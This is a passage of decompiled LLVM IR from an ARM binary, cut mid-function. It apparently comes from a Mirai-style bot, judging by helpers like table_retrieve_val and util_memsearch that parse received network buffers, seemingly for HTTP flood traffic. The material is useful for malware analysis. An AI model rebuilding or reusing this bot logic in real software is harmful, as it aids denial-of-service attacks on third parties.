  store i32 %v3_8e10, i32* @r3, align 4
  %v2_8e14 = sub i32 %v3_8e10, %v0_8e08
  store i32 %v2_8e14, i32* @r4, align 4
  store i32 %v2_8e14, i32* @r2, align 4
  store i32 %v2_8e14, i32* %v2_8e10, align 4
  %v0_8e20 = load i32, i32* @r7, align 4
  %v1_8e20 = load i32, i32* @r6, align 4
  %v2_8e20 = add i32 %v1_8e20, %v0_8e20
  store i32 %v2_8e20, i32* @r1, align 4
  store i32 %v0_8e20, i32* @r0, align 4
  %v3_8e28 = call i32 @memmove(i32 %v0_8e20, i32 %v2_8e20, i32 %v2_8e14)
  store i32 %v3_8e28, i32* %r0.global-to-local, align 4
  %v0_8e2c = load i32, i32* @sl, align 4
  %v1_8e2c = add i32 %v0_8e2c, 660
  %v2_8e2c = inttoptr i32 %v1_8e2c to i32*
  %v3_8e2c = load i32, i32* %v2_8e2c, align 4
  store i32 %v3_8e2c, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8e34 = load i32, i32* %sb.global-to-local, align 4
  %v2_8e34 = add i32 %v0_8e34, %v3_8e2c
  store i32 %v2_8e34, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e38 = icmp eq i32 %v3_8e2c, 0
  store i1 %v2_8e38, i1* %cpsr_z.global-to-local, align 1
  %v3_8e3c = add i32 %v2_8e34, 2116
  %v4_8e3c = inttoptr i32 %v3_8e3c to i8*
  store i8 0, i8* %v4_8e3c, align 1
  %v0_8e40 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8e40, label %dec_label_pc_8e58, label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %dec_label_pc_8e10, %dec_label_pc_8da4
  %v0_8e44 = load i32, i32* @sl, align 4
  %v1_8e44 = add i32 %v0_8e44, 12
  %v2_8e44 = inttoptr i32 %v1_8e44 to i32*
  %v3_8e44 = load i32, i32* %v2_8e44, align 4
  store i32 %v3_8e44, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e48 = icmp eq i32 %v3_8e44, 0
  store i1 %v2_8e48, i1* %cpsr_z.global-to-local, align 1
  %v5_8e4c = icmp sgt i32 %v3_8e44, 0
  br i1 %v5_8e4c, label %dec_label_pc_8dbc, label %dec_label_pc_8e50

dec_label_pc_8e50:                                ; preds = %dec_label_pc_8e44
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_8de0

dec_label_pc_8e58:                                ; preds = %dec_label_pc_8e10, %dec_label_pc_8e08
  %v0_8e58 = load i32, i32* @sl, align 4
  %v1_8e58 = add i32 %v0_8e58, -1448
  %v2_8e58 = inttoptr i32 %v1_8e58 to i8*
  %v3_8e58 = load i8, i8* %v2_8e58, align 1
  %v4_8e58 = zext i8 %v3_8e58 to i32
  store i32 %v4_8e58, i32* %r3.global-to-local, align 4
  %v2_8e5c = icmp ugt i8 %v3_8e58, 6
  store i1 %v2_8e5c, i1* %cpsr_c.global-to-local, align 1
  %v7_8e5c = icmp eq i8 %v3_8e58, 7
  store i1 %v7_8e5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e5c, label %dec_label_pc_8e64, label %dec_label_pc_87ec

dec_label_pc_8e64:                                ; preds = %dec_label_pc_8e58
  %v1_8e64 = add i32 %v0_8e58, 660
  %v2_8e64 = inttoptr i32 %v1_8e64 to i32*
  %v3_8e64 = load i32, i32* %v2_8e64, align 4
  store i32 %v3_8e64, i32* @r3, align 4
  %v2_8e68 = icmp ugt i32 %v3_8e64, 1023
  store i1 %v2_8e68, i1* %cpsr_c.global-to-local, align 1
  %v7_8e68 = icmp eq i32 %v3_8e64, 1024
  store i1 %v7_8e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e68, label %dec_label_pc_8e70.loopexit, label %dec_label_pc_8d74

dec_label_pc_8e70.loopexit:                       ; preds = %dec_label_pc_8e64
  %v0_8e70.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_8e78.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e70

dec_label_pc_8e70:                                ; preds = %dec_label_pc_8e70.loopexit, %dec_label_pc_8d58
  %v0_8e78 = phi i32 [ %v0_8e78.pre, %dec_label_pc_8e70.loopexit ], [ %v1_8d6c, %dec_label_pc_8d58 ]
  %v0_8e70 = phi i32 [ %v0_8e70.pre, %dec_label_pc_8e70.loopexit ], [ %v0_8d60, %dec_label_pc_8d58 ]
  %v1_8e74 = add i32 %v0_8e70, 2180
  store i32 %v1_8e74, i32* @r1, align 4
  store i32 %v0_8e78, i32* @r0, align 4
  store i32 960, i32* @r2, align 4
  %v3_8e80 = call i32 @memmove(i32 %v0_8e78, i32 %v1_8e74, i32 960)
  store i32 %v3_8e80, i32* %r0.global-to-local, align 4
  %v0_8e84 = load i32, i32* @sl, align 4
  %v1_8e84 = add i32 %v0_8e84, 660
  %v2_8e84 = inttoptr i32 %v1_8e84 to i32*
  %v3_8e84 = load i32, i32* %v2_8e84, align 4
  store i32 %v3_8e84, i32* %r3.global-to-local, align 4
  %v1_8e88 = add i32 %v3_8e84, -64
  store i32 %v1_8e88, i32* @r4, align 4
  store i32 %v1_8e88, i32* %v2_8e84, align 4
  br label %dec_label_pc_8d74

dec_label_pc_8e94:                                ; preds = %dec_label_pc_8dbc
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v3_8e9c = call i32 @table_retrieve_val(i32 43, i32* null)
  %v0_8ea0 = load i32, i32* @r4, align 4
  store i32 %v0_8ea0, i32* %r1.global-to-local, align 4
  store i32 %v3_8e9c, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_8eac = load i32, i32* @r7, align 4
  store i32 %v0_8eac, i32* %r0.global-to-local, align 4
  %v4_8eb0 = call i32 @util_memsearch(i32 %v0_8eac, i32 %v0_8ea0, i32 %v3_8e9c, i32 11)
  store i32 %v4_8eb0, i32* %r0.global-to-local, align 4
  %v3_8eb4 = icmp eq i32 %v4_8eb0, -1
  store i1 %v3_8eb4, i1* %cpsr_c.global-to-local, align 1
  %v8_8eb4 = icmp eq i32 %v4_8eb0, -1
  store i1 %v8_8eb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8eb4, label %dec_label_pc_8ebc, label %dec_label_pc_998c

dec_label_pc_8ebc:                                ; preds = %dec_label_pc_8e94
  %v0_8ebc = load i32, i32* @sl, align 4
  %v1_8ebc = add i32 %v0_8ebc, 12
  %v2_8ebc = inttoptr i32 %v1_8ebc to i32*
  %v3_8ebc = load i32, i32* %v2_8ebc, align 4
  store i32 %v3_8ebc, i32* @r5, align 4
  br label %dec_label_pc_8de0

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8de8
  %v0_8ec4 = load i32, i32* @r7, align 4
  store i32 %v0_8ec4, i32* %r0.global-to-local, align 4
  %v1_8ec8 = add i32 %v0_8de8, 660
  %v2_8ec8 = inttoptr i32 %v1_8ec8 to i32*
  %v3_8ec8 = load i32, i32* %v2_8ec8, align 4
  store i32 %v3_8ec8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_8ed4 = call i32 @util_memsearch(i32 %v0_8ec4, i32 %v3_8ec8, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32 2)
  store i32 %v5_8ed4, i32* %r0.global-to-local, align 4
  %v2_8ed8 = icmp eq i32 %v5_8ed4, -1
  store i1 %v2_8ed8, i1* %cpsr_c.global-to-local, align 1
  %v7_8ed8 = icmp eq i32 %v5_8ed4, -1
  store i1 %v7_8ed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8ed8, label %dec_label_pc_8e08, label %dec_label_pc_8ee0

dec_label_pc_8ee0:                                ; preds = %dec_label_pc_8ec4
  %v0_8ee0 = load i32, i32* @sl, align 4
  %v1_8ee0 = add i32 %v0_8ee0, 660
  %v2_8ee0 = inttoptr i32 %v1_8ee0 to i32*
  %v3_8ee0 = load i32, i32* %v2_8ee0, align 4
  store i32 %v3_8ee0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_8eec = load i32, i32* @r7, align 4
  store i32 %v0_8eec, i32* %r0.global-to-local, align 4
  %v5_8ef0 = call i32 @util_memsearch(i32 %v0_8eec, i32 %v3_8ee0, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32 2)
  %v0_8ef4 = load i32, i32* %sb.global-to-local, align 4
  %v2_8ef4 = add i32 %v0_8ef4, %v5_8ef0
  store i32 %v2_8ef4, i32* %ip.global-to-local, align 4
  store i32 %v5_8ef0, i32* @r6, align 4
  store i32 %v5_8ef0, i32* %r1.global-to-local, align 4
  %v0_8f00 = load i32, i32* @r7, align 4
  store i32 %v0_8f00, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a798.50 to i32), i32* %r2.global-to-local, align 4
  %v0_8f08 = load i32, i32* @r4, align 4
  store i32 %v0_8f08, i32* %r3.global-to-local, align 4
  %v0_8f0c = load i32, i32* @r5, align 4
  %v1_8f0c = trunc i32 %v0_8f0c to i8
  %v3_8f0c = add i32 %v2_8ef4, 2114
  %v4_8f0c = inttoptr i32 %v3_8f0c to i8*
  store i8 %v1_8f0c, i8* %v4_8f0c, align 1
  %v4_8f10 = call i32 @util_memsearch(i32 %v0_8f00, i32 %v5_8ef0, i32 ptrtoint (i32* @global_var_1a798.50 to i32), i32 %v0_8f08)
  store i32 %v4_8f10, i32* %r0.global-to-local, align 4
  %v2_8f14 = icmp eq i32 %v4_8f10, -1
  store i1 %v2_8f14, i1* %cpsr_c.global-to-local, align 1
  %v7_8f14 = icmp eq i32 %v4_8f10, -1
  store i1 %v7_8f14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8f14, label %dec_label_pc_8f38, label %dec_label_pc_8f1c

dec_label_pc_8f1c:                                ; preds = %dec_label_pc_8ee0
  %v0_8f1c = load i32, i32* @r7, align 4
  store i32 %v0_8f1c, i32* %r0.global-to-local, align 4
  %v0_8f20 = load i32, i32* @r6, align 4
  store i32 %v0_8f20, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a798.50 to i32), i32* %r2.global-to-local, align 4
  %v0_8f28 = load i32, i32* @r4, align 4
  store i32 %v0_8f28, i32* %r3.global-to-local, align 4
  %v4_8f2c = call i32 @util_memsearch(i32 %v0_8f1c, i32 %v0_8f20, i32 ptrtoint (i32* @global_var_1a798.50 to i32), i32 %v0_8f28)
  %v0_8f30 = load i32, i32* %sb.global-to-local, align 4
  %v2_8f30 = add i32 %v0_8f30, %v4_8f2c
  store i32 %v2_8f30, i32* %r0.global-to-local, align 4
  %v0_8f34 = load i32, i32* @r5, align 4
  %v1_8f34 = trunc i32 %v0_8f34 to i8
  %v3_8f34 = add i32 %v2_8f30, 2116
  %v4_8f34 = inttoptr i32 %v3_8f34 to i8*
  store i8 %v1_8f34, i8* %v4_8f34, align 1
  br label %dec_label_pc_8f38

dec_label_pc_8f38:                                ; preds = %dec_label_pc_8ee0, %dec_label_pc_8f1c
  %v0_8f38 = load i32, i32* @r7, align 4
  store i32 %v0_8f38, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_8f40 = inttoptr i32 %v0_8f38 to i8*
  %v3_8f40 = call i32 @util_atoi(i8* %v2_8f40, i32 16)
  store i32 %v3_8f40, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8f44 = icmp eq i32 %v3_8f40, 0
  store i1 %v2_8f44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f44, label %dec_label_pc_9b40, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f38
  %v1_8f4c = add i32 %v3_8f40, 2
  store i32 %v1_8f4c, i32* %r3.global-to-local, align 4
  %v1_8f50 = load i32, i32* @sl, align 4
  %v2_8f50 = add i32 %v1_8f50, 12
  %v3_8f50 = inttoptr i32 %v2_8f50 to i32*
  store i32 %v1_8f4c, i32* %v3_8f50, align 4
  br label %dec_label_pc_8e08

dec_label_pc_8f58:                                ; preds = %dec_label_pc_85c4
  %v2_8f58 = inttoptr i32 %v1_8618 to i32*
  %v3_8f58 = load i32, i32* %v2_8f58, align 4
  store i32 %v3_8f58, i32* %ip.global-to-local, align 4
  %v3_8f60 = udiv i32 %v3_8f58, 32
  %v3_8f64 = mul nuw nsw i32 %v3_8f60, 4
  store i32 %v2_8710, i32* @lr, align 4
  %v2_8f6c = add i32 %v3_8f64, %v2_8710
  store i32 %v2_8f6c, i32* %r2.global-to-local, align 4
  %v1_8f70 = add i32 %v2_8f6c, -164
  %v2_8f70 = inttoptr i32 %v1_8f70 to i32*
  %v3_8f70 = load i32, i32* %v2_8f70, align 4
  %v1_8f74 = urem i32 %v3_8f58, 32
  store i32 %v1_8f74, i32* %r0.global-to-local, align 4
  store i32 %v1_85bc, i32* %r3.global-to-local, align 4
  %v7_8f7c = shl i32 %v1_85bc, %v1_8f74
  %v8_8f7c = or i32 %v3_8f70, %v7_8f7c
  store i32 %v8_8f7c, i32* @r1, align 4
  %v1_8f80 = load i32, i32* @r8, align 4
  %v2_8f80 = sub i32 %v3_8f58, %v1_8f80
  %v3_8f80 = icmp uge i32 %v3_8f58, %v1_8f80
  store i1 %v3_8f80, i1* %cpsr_c.global-to-local, align 1
  %v4_8f80 = xor i32 %v1_8f80, %v3_8f58
  %v5_8f80 = xor i32 %v2_8f80, %v3_8f58
  %v6_8f80 = and i32 %v5_8f80, %v4_8f80
  %v7_8f80 = icmp slt i32 %v6_8f80, 0
  %v8_8f80 = icmp slt i32 %v2_8f80, 0
  %v9_8f80 = icmp eq i32 %v3_8f58, %v1_8f80
  store i1 %v9_8f80, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8f7c, i32* %v2_8f70, align 4
  %v3_8f88 = xor i1 %v8_8f80, %v7_8f80
  %v4_8f88 = or i1 %v9_8f80, %v3_8f88
  br i1 %v4_8f88, label %dec_label_pc_85f4, label %dec_label_pc_8f8c

dec_label_pc_8f8c:                                ; preds = %dec_label_pc_8f58
  %v0_8f8c = load i32, i32* %ip.global-to-local, align 4
  %v1_8f8c = load i32, i32* %r3.global-to-local, align 4
  %v2_8f8c = add i32 %v1_8f8c, %v0_8f8c
  store i32 %v2_8f8c, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_8f94:                                ; preds = %dec_label_pc_8848
  store i32 %v3_888c, i32* %r0.global-to-local, align 4
  %v1_8f98 = call i32 @__GI___libc_close(i32 %v3_888c)
  store i32 %v1_8f98, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_8fa0 = load i32, i32* @sl, align 4
  %v2_8fa0 = add i32 %v1_8fa0, -1452
  %v3_8fa0 = inttoptr i32 %v2_8fa0 to i32*
  store i32 -1, i32* %v3_8fa0, align 4
  %v0_8fa4 = load i32, i32* @r5, align 4
  %v1_8fa4 = trunc i32 %v0_8fa4 to i8
  %v2_8fa4 = load i32, i32* @sl, align 4
  %v3_8fa4 = add i32 %v2_8fa4, -1448
  %v4_8fa4 = inttoptr i32 %v3_8fa4 to i8*
  store i8 %v1_8fa4, i8* %v4_8fa4, align 1
  br label %dec_label_pc_87ec

dec_label_pc_8fac:                                ; preds = %dec_label_pc_85cc
  %v2_8fac = inttoptr i32 %v1_8618 to i32*
  %v3_8fac = load i32, i32* %v2_8fac, align 4
  store i32 %v3_8fac, i32* %ip.global-to-local, align 4
  %v3_8fb4 = udiv i32 %v3_8fac, 32
  store i32 %v2_8710, i32* %r1.global-to-local, align 4
  %v3_8fbc = mul nuw nsw i32 %v3_8fb4, 4
  %v2_8fc0 = add i32 %v3_8fbc, %v2_8710
  store i32 %v2_8fc0, i32* %r2.global-to-local, align 4
  %v1_8fc4 = add i32 %v2_8fc0, -164
  %v2_8fc4 = inttoptr i32 %v1_8fc4 to i32*
  %v3_8fc4 = load i32, i32* %v2_8fc4, align 4
  %v1_8fc8 = urem i32 %v3_8fac, 32
  store i32 %v1_8fc8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8fd0 = shl i32 1, %v1_8fc8
  %v8_8fd0 = or i32 %v3_8fc4, %v7_8fd0
  store i32 %v8_8fd0, i32* @r1, align 4
  %v1_8fd4 = load i32, i32* @r8, align 4
  %v2_8fd4 = sub i32 %v3_8fac, %v1_8fd4
  %v3_8fd4 = icmp uge i32 %v3_8fac, %v1_8fd4
  store i1 %v3_8fd4, i1* %cpsr_c.global-to-local, align 1
  %v4_8fd4 = xor i32 %v1_8fd4, %v3_8fac
  %v5_8fd4 = xor i32 %v2_8fd4, %v3_8fac
  %v6_8fd4 = and i32 %v5_8fd4, %v4_8fd4
  %v7_8fd4 = icmp slt i32 %v6_8fd4, 0
  %v8_8fd4 = icmp slt i32 %v2_8fd4, 0
  %v9_8fd4 = icmp eq i32 %v3_8fac, %v1_8fd4
  store i1 %v9_8fd4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8fd0, i32* %v2_8fc4, align 4
  %v3_8fdc = xor i1 %v8_8fd4, %v7_8fd4
  %v4_8fdc = or i1 %v9_8fd4, %v3_8fdc
  br i1 %v4_8fdc, label %dec_label_pc_85f4, label %dec_label_pc_8fe0

dec_label_pc_8fe0:                                ; preds = %dec_label_pc_8fac
  %v0_8fe0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8fe0 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fe0 = add i32 %v1_8fe0, %v0_8fe0
  store i32 %v2_8fe0, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_9028:                                ; preds = %dec_label_pc_87d0
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_9030 = call i32 @util_zero(i32 %v2_827c, i32 10240)
  store i32 %v2_9030, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_903c = load i32, i32* @sl, align 4
  %v1_903c = add i32 %v0_903c, -1452
  %v2_903c = inttoptr i32 %v1_903c to i32*
  %v3_903c = load i32, i32* %v2_903c, align 4
  store i32 %v3_903c, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v4_9048 = call i32 @__libc_recv(i32 %v3_903c, i32 %v2_827c, i32 10240, i32 16386)
  store i32 %v4_9048, i32* %r0.global-to-local, align 4
  store i32 %v4_9048, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9050 = icmp eq i32 %v4_9048, 0
  store i1 %v2_9050, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r7, align 4
  %tmp182 = icmp slt i32 %v4_9048, 1
  br i1 %tmp182, label %dec_label_pc_9550, label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9028
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  store i32 %v4_9048, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a790.52 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_906c = call i32 @util_memsearch(i32 %v2_827c, i32 %v4_9048, i32 ptrtoint ([5 x i8]* @global_var_1a790.52 to i32), i32 4)
  store i32 %v5_906c, i32* %r0.global-to-local, align 4
  %v3_9070 = icmp eq i32 %v5_906c, -1
  store i1 %v3_9070, i1* %cpsr_c.global-to-local, align 1
  %v8_9070 = icmp eq i32 %v5_906c, -1
  store i1 %v8_9070, i1* %cpsr_z.global-to-local, align 1
  %v0_9078 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v3_9070, label %dec_label_pc_9078, label %dec_label_pc_9080

dec_label_pc_9078:                                ; preds = %dec_label_pc_905c
  %v3_9078 = icmp ugt i32 %v0_9078, 10239
  store i1 %v3_9078, i1* %cpsr_c.global-to-local, align 1
  %v8_9078 = icmp eq i32 %v0_9078, 10240
  store i1 %v8_9078, i1* %cpsr_z.global-to-local, align 1
  %v5_907c = icmp slt i32 %v0_9078, 10240
  br i1 %v5_907c, label %dec_label_pc_87ec, label %dec_label_pc_9080

dec_label_pc_9080:                                ; preds = %dec_label_pc_905c, %dec_label_pc_9078
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a790.52 to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_9078, i32* %r1.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v5_9090 = call i32 @util_memsearch(i32 %v2_827c, i32 %v0_9078, i32 ptrtoint ([5 x i8]* @global_var_1a790.52 to i32), i32 4)
  store i32 %v2_827c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v4_909c = add i32 %v5_9090, %v2_827c
  %v5_909c = inttoptr i32 %v4_909c to i8*
  store i8 0, i8* %v5_909c, align 1
  %v0_90a0 = load i32, i32* @r5, align 4
  store i32 %v0_90a0, i32* %r1.global-to-local, align 4
  store i32 53, i32* %r0.global-to-local, align 4
  %v2_90a8 = inttoptr i32 %v0_90a0 to i32*
  %v3_90a8 = call i32 @table_retrieve_val(i32 53, i32* %v2_90a8)
  %v0_90ac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_90ac, i32* @r1, align 4
  store i32 %v3_90a8, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_90b8 = call i32 @util_stristr(i8* %tmp169, i32 %v0_90ac, i32 %v3_90a8)
  store i32 %v4_90b8, i32* %r0.global-to-local, align 4
  %v2_90bc = icmp eq i32 %v4_90b8, -1
  store i1 %v2_90bc, i1* %cpsr_c.global-to-local, align 1
  %v7_90bc = icmp eq i32 %v4_90b8, -1
  store i1 %v7_90bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90bc, label %.thread24, label %bb183

bb183:                                            ; preds = %dec_label_pc_9080
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_90c4 = load i32, i32* @sl, align 4
  %v3_90c4 = inttoptr i32 %v2_90c4 to i32*
  store i32 2, i32* %v3_90c4, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_9080, %bb183
  %v0_90c8 = load i32, i32* @r5, align 4
  store i32 %v0_90c8, i32* %r1.global-to-local, align 4
  store i32 52, i32* %r0.global-to-local, align 4
  %v2_90d0 = inttoptr i32 %v0_90c8 to i32*
  %v3_90d0 = call i32 @table_retrieve_val(i32 52, i32* %v2_90d0)
  %v0_90d4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_90d4, i32* @r1, align 4
  store i32 %v3_90d0, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_90e0 = call i32 @util_stristr(i8* %tmp169, i32 %v0_90d4, i32 %v3_90d0)
  store i32 %v4_90e0, i32* %r0.global-to-local, align 4
  %v2_90e4 = icmp eq i32 %v4_90e0, -1
  store i1 %v2_90e4, i1* %cpsr_c.global-to-local, align 1
  %v7_90e4 = icmp eq i32 %v4_90e0, -1
  store i1 %v7_90e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90e4, label %.thread25, label %bb184

bb184:                                            ; preds = %.thread24
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_90ec = load i32, i32* @sl, align 4
  %v3_90ec = inttoptr i32 %v2_90ec to i32*
  store i32 1, i32* %v3_90ec, align 4
  br label %.thread25

.thread25:                                        ; preds = %.thread24, %bb184
  %v0_90f0 = load i32, i32* @r5, align 4
  store i32 %v0_90f0, i32* %r1.global-to-local, align 4
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_90f8 = load i32, i32* @sl, align 4
  %v2_90f8 = add i32 %v1_90f8, 4
  %v3_90f8 = inttoptr i32 %v2_90f8 to i32*
  store i32 %v0_90f0, i32* %v3_90f8, align 4
  %v2_90fc = inttoptr i32 %v0_90f0 to i32*
  %v3_90fc = call i32 @table_retrieve_val(i32 51, i32* %v2_90fc)
  %v0_9100 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9100, i32* @r1, align 4
  store i32 %v3_90fc, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_910c = call i32 @util_stristr(i8* %tmp169, i32 %v0_9100, i32 %v3_90fc)
  store i32 %v4_910c, i32* %r0.global-to-local, align 4
  %v2_9110 = icmp eq i32 %v4_910c, -1
  store i1 %v2_9110, i1* %cpsr_c.global-to-local, align 1
  %v7_9110 = icmp eq i32 %v4_910c, -1
  store i1 %v7_9110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9110, label %.thread26, label %dec_label_pc_9118

dec_label_pc_9118:                                ; preds = %.thread25
  %v0_9118 = load i32, i32* @r5, align 4
  store i32 %v0_9118, i32* %r1.global-to-local, align 4
  store i32 51, i32* %r0.global-to-local, align 4
  %v2_9120 = inttoptr i32 %v0_9118 to i32*
  %v3_9120 = call i32 @table_retrieve_val(i32 51, i32* %v2_9120)
  %v0_9124 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9124, i32* @r1, align 4
  store i32 %v3_9120, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_9130 = call i32 @util_stristr(i8* %tmp169, i32 %v0_9124, i32 %v3_9120)
  store i32 %v4_9130, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v2_9138 = add i32 %v4_9130, %v2_827c
  %v3_9138 = inttoptr i32 %v2_9138 to i8*
  %v4_9138 = load i8, i8* %v3_9138, align 1
  %v2_9140 = icmp ugt i8 %v4_9138, 31
  store i1 %v2_9140, i1* %cpsr_c.global-to-local, align 1
  %v7_9140 = icmp eq i8 %v4_9138, 32
  store i1 %v7_9140, i1* %cpsr_z.global-to-local, align 1
  %v2_9148 = zext i1 %v7_9140 to i32
  %v2_9148.v4_9130 = add i32 %v2_9148, %v4_9130
  store i32 %v2_9148.v4_9130, i32* @r4, align 4
  %v2_914c = add i32 %v2_9148.v4_9130, %v2_827c
  store i32 %v2_914c, i32* @r6, align 4
  store i32 %v2_914c, i32* %r0.global-to-local, align 4
  %v1_9154 = load i32, i32* %fp.global-to-local, align 4
  %v2_9154 = sub i32 %v1_9154, %v2_9148.v4_9130
  store i32 %v2_9154, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9160 = call i32 @util_memsearch(i32 %v2_914c, i32 %v2_9154, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32 2)
  store i32 %v5_9160, i32* %r0.global-to-local, align 4
  %v2_9164 = icmp eq i32 %v5_9160, -1
  store i1 %v2_9164, i1* %cpsr_c.global-to-local, align 1
  %v7_9164 = icmp eq i32 %v5_9160, -1
  store i1 %v7_9164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9164, label %.thread26, label %dec_label_pc_916c

dec_label_pc_916c:                                ; preds = %dec_label_pc_9118
  %v2_916c = icmp ne i32 %v5_9160, 0
  store i1 %v2_916c, i1* %cpsr_c.global-to-local, align 1
  %v7_916c = icmp eq i32 %v5_9160, 1
  store i1 %v7_916c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %r2.global-to-local, align 4
  %v7_9174 = icmp slt i32 %v5_9160, 2
  br i1 %v7_9174, label %bb186, label %bb185

bb185:                                            ; preds = %dec_label_pc_916c
  %v9_9174 = add i32 %v5_9160, -2
  store i32 %v9_9174, i32* %r0.global-to-local, align 4
  br label %bb186

bb186:                                            ; preds = %dec_label_pc_916c, %bb185
  %v1_917c = phi i32 [ %v5_9160, %dec_label_pc_916c ], [ %v9_9174, %bb185 ]
  store i32 %v2_8710, i32* %r2.global-to-local, align 4
  %v2_917c = add i32 %v1_917c, %v2_8710
  %v1_9180 = load i32, i32* @r4, align 4
  %v2_9180 = add i32 %v2_917c, %v1_9180
  store i32 %v2_9180, i32* %r3.global-to-local, align 4
  %v0_9184 = load i32, i32* @r5, align 4
  %v1_9184 = trunc i32 %v0_9184 to i8
  %v3_9184 = load i32, i32* @r7, align 4
  %v4_9184 = add i32 %v3_9184, %v2_9180
  %v5_9184 = inttoptr i32 %v4_9184 to i8*
  store i8 %v1_9184, i8* %v5_9184, align 1
  %v0_9188 = load i32, i32* @r6, align 4
  store i32 %v0_9188, i32* %r0.global-to-local, align 4
  %v1_918c = inttoptr i32 %v0_9188 to i8*
  %v2_918c = call i32 @util_strlen(i8* %v1_918c)
  %v0_9190 = load i32, i32* @r5, align 4
  store i32 %v0_9190, i32* %r1.global-to-local, align 4
  store i32 %v2_918c, i32* @r4, align 4
  store i32 50, i32* %r0.global-to-local, align 4
  %v2_919c = inttoptr i32 %v0_9190 to i32*
  %v3_919c = call i32 @table_retrieve_val(i32 50, i32* %v2_919c)
  %v0_91a0 = load i32, i32* @r4, align 4
  store i32 %v0_91a0, i32* @r1, align 4
  store i32 %v3_919c, i32* %r2.global-to-local, align 4
  %v0_91a8 = load i32, i32* @r6, align 4
  store i32 %v0_91a8, i32* %r0.global-to-local, align 4
  %v3_91ac = inttoptr i32 %v0_91a8 to i8*
